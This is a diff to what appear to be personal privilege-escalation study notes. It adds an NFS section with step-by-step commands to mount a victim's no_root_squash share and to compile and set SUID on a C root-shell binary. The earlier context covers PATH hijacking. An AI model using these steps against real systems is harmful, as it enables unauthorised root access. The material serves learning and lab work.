@@ -176,7 +176,40 @@ chmod 777 boy
 - Thus when the root owned script runs, on failing to find boy in system, it will check in folders in path, and will excute the boy file we created in /tmp and we will gain superuser permissions as root.
 
 
-### 7. NFS
-- 
+### 7. NFS(Network File Systems)
+- Shared folders and remote management interfaces e.g. ssh and telnet may be used to gain root access to a system.e.g.<br>
+find root ssh key on target system and logging in with it<br>
+misconfigured network shell<br>
+- NFS configuration is stored in **/etc/exports** file
+- By default, NFS will change the root user to **nfsnobody** and strip any file from operating with root privileges.
+- In the file, if **no_root_squash** is present on writable share, we can create an excutable with suid bit set and run it on target system.<br>
+<ins>Steps</ins>
+1. Enumerate mountable shares from our attacking machine
+```
+showmount -e <victim-ip>
+```
+- We will mount on one of the **no_root_squash** to our attacking machine and build our executable
+```
+mkdir /tmp/backupsonattackermachine
 
+mount -o rw <victim-ip>:/backups /tmp/backupsonattacker machine
 
+```
+- As we can set SUID bits, a simple executable that will run /bin/bash  on target machine will do the job
+```
+int main()
+{
+	setgid(0);
+	setuid(0);
+	system("/bin/bash");
+	return 0;
+}
+```
+- compile and set the SUID bit
+```
+root@boy:/tmp/backupsonattackermachine# gcc boy.c -o boy
+root@boy:/tmp/backupsonattackermachine# chmod +s boy
+root@boy:/tmp/backupsonattackermachine# ls -l boy
+-rwsr-sr-x 1 root root 16712 Feb 10 20:50 boy
+``` 
+- Since its a mounted system, the files will also be available on target system, from which we can just execute our binary and be gain super user permissions.
